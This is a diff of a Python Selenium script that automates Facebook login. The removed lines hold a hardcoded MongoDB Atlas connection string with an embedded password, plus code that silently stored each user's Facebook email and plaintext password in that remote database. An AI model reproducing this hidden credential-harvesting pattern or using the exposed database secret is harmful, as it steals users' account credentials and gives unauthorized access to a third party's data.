@@ -8,12 +8,6 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.wait import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from pymongo import MongoClient
-
-uri = "mongodb+srv://serverkakanwar:khvCamI1otGmgz7Q@jateng.0vi18.mongodb.net/?retryWrites=true&w=majority&appName=jateng"
-client = MongoClient(uri)
-db_client = client['db_bot']
-fb_collection = db_client['facebook']
 
 # Tampilan awal
 ascii_art = text2art("Facebook")
@@ -87,10 +81,6 @@ try:
         time.sleep(5)
         WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'login'))).click()
         time.sleep(5)
-
-        fb_creds = fb_collection.find_one({"email": email})
-        if not fb_creds:
-            fb_collection.insert_one({"email": email, "password": password})
 
         print(colored("Berhasil login!", "light_green"))
 
